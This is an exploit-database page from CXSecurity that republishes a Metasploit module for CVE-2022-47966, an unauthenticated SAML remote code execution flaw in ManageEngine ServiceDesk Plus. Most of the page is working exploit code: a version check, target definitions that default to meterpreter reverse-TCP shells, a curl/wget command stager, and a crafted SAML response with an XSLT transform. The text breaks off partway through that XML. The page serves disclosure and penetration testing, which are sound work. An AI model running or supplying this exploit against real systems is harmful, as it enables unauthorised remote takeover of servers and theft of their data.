---
title: Zoho ManageEngine ServiceDesk Plus 14003 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023020017
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-09
fetch_date: 2025-10-04T06:06:33.716768
---

# Zoho ManageEngine ServiceDesk Plus 14003 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Zoho ManageEngine ServiceDesk Plus 14003 Remote Code Execution** **2023-02-08 / 2023-02-09**  Credit:  **[Christophe de la Fuente](https://cxsecurity.com/author/Christophe%2Bde%2Bla%2BFuente/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-47966](https://cxsecurity.com/cveshow/CVE-2022-47966/ "Click to see CVE-2022-47966")**  CWE: **N/A** | |

# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'ManageEngine ServiceDesk Plus Unauthenticated SAML RCE',
'Description' => %q{
This exploits an unauthenticated remote code execution vulnerability
that affects Zoho ManageEngine ServiceDesk Plus versions 14003 and
below (CVE-2022-47966). Due to a dependency to an outdated library
(Apache Santuario version 1.4.1), it is possible to execute arbitrary
code by providing a crafted `samlResponse` XML to the ServiceDesk Plus
SAML endpoint. Note that the target is only vulnerable if it has been
configured with SAML-based SSO at least once in the past, regardless of
the current SAML-based SSO status.
},
'Author' => [
'Khoa Dinh', # Original research
'horizon3ai', # PoC
'Christophe De La Fuente' # Metasploit module
],
'License' => MSF\_LICENSE,
'References' => [
['CVE', '2022-47966'],
['URL', 'https://blog.viettelcybersecurity.com/saml-show-stopper/'],
['URL', 'https://www.horizon3.ai/manageengine-cve-2022-47966-technical-deep-dive/'],
['URL', 'https://github.com/horizon3ai/CVE-2022-47966'],
['URL', 'https://attackerkb.com/topics/gvs0Gv8BID/cve-2022-47966/rapid7-analysis']
],
'Platform' => ['win', 'unix', 'linux'],
'Payload' => {
'BadChars' => "\x27"
},
'Targets' => [
[
'Windows EXE Dropper',
{
'Platform' => 'win',
'Arch' => [ARCH\_X86, ARCH\_X64],
'Type' => :windows\_dropper,
'DefaultOptions' => { 'Payload' => 'windows/x64/meterpreter/reverse\_tcp' }
}
],
[
'Windows Command',
{
'Platform' => 'win',
'Arch' => ARCH\_CMD,
'Type' => :windows\_command,
'DefaultOptions' => { 'Payload' => 'cmd/windows/powershell/meterpreter/reverse\_tcp' }
}
],
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd,
'DefaultOptions' => { 'Payload' => 'cmd/unix/python/meterpreter/reverse\_tcp' }
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'Arch' => [ARCH\_X86, ARCH\_X64],
'Type' => :linux\_dropper,
'DefaultOptions' => { 'Payload' => 'linux/x64/meterpreter/reverse\_tcp' },
'CmdStagerFlavor' => %w[curl wget echo lwprequest]
}
]
],
'DefaultOptions' => {
'RPORT' => 8080
},
'DefaultTarget' => 1,
'DisclosureDate' => '2023-01-10',
'Notes' => {
'Stability' => [CRASH\_SAFE,],
'SideEffects' => [ARTIFACTS\_ON\_DISK, IOC\_IN\_LOGS],
'Reliability' => [REPEATABLE\_SESSION]
},
'Privileged' => true
)
)
register\_options([
OptString.new('TARGETURI', [ true, 'The SAML endpoint URL', '/SamlResponseServlet' ]),
OptInt.new('DELAY', [ true, 'Number of seconds to wait between each request', 5 ])
])
end
def check
res = send\_request\_cgi(
'method' => 'GET',
'uri' => normalize\_uri(datastore['TARGETURI'])
)
return CheckCode::Unknown unless res
# vulnerable servers respond with 400 and a HTML body
return CheckCode::Safe unless res.code == 400
script = res.get\_html\_document.xpath('//script[contains(text(), "BUILD\_NUMBER")]')
info = script.text.match(/PRODUCT\_NAME\\x22\\x3A\\x22(?<product>.+?)\\x22,.\*BUILD\_NUMBER\\x22\\x3A\\x22(?<build>[0-9]+?)\\x22,/)
return CheckCode::Unknown unless info
unless info[:product] == 'ManageEngine\\x20ServiceDesk\\x20Plus'
return CheckCode::Safe("This is not ManageEngine ServiceDesk Plus (#{info[:product]})")
end
# SAML 2.0 support has been added in build 10511
# see https://www.manageengine.com/products/service-desk/on-premises/readme.html#readme105
build = Rex::Version.new(info[:build])
unless build >= Rex::Version.new('10511') && build <= Rex::Version.new('14003')
return CheckCode::Safe("Target build is #{info[:build]}")
end
CheckCode::Appears
end
def encode\_begin(real\_payload, reqs)
super
reqs['EncapsulationRoutine'] = proc do |\_reqs, raw|
raw.start\_with?('powershell') ? raw.gsub('$', '`$') : raw
end
end
def exploit
case target['Type']
when :windows\_command, :unix\_cmd
execute\_command(payload.encoded)
when :windows\_dropper, :linux\_dropper
execute\_cmdstager(delay: datastore['DELAY'])
end
end
def execute\_command(cmd, \_opts = {})
case target['Type']
when :windows\_dropper
cmd = "cmd /c #{cmd}"
when :unix\_cmd, :linux\_dropper
cmd = cmd.gsub(' ') { '${IFS}' }
cmd = "bash -c #{cmd}"
end
cmd = cmd.encode(xml: :attr).gsub('"', '')
assertion\_id = "\_#{SecureRandom.uuid}"
# Randomize variable names and make sure they are all different using a Set
vars = Set.new
loop do
vars << Rex::Text.rand\_text\_alpha\_lower(5..8)
break unless vars.size < 3
end
vars = vars.to\_a
saml = <<~EOS
<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response
ID="\_#{SecureRandom.uuid}"
InResponseTo="\_#{Rex::Text.rand\_text\_hex(32)}"
IssueInstant="#{Time.now.iso8601}" Version="2.0" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
<samlp:Status>
<samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
</samlp:Status>
<Assertion ID="#{assertion\_id}"
IssueInstant="#{Time.now.iso8601}" Version="2.0" xmlns="urn:oasis:names:tc:SAML:2.0:assertion">
<Issuer>#{Rex::Text.rand\_text\_alphanumeric(3..10)}</Issuer>
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
<ds:SignedInfo>
<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
<ds:Reference URI="##{assertion\_id}">
<ds:Transforms>
<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
<ds:Transform Algorithm="http://www.w3.org/TR/1999/REC-xslt-19991116">
<xsl:stylesheet version="1.0"
xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"
xmlns:rt="http:...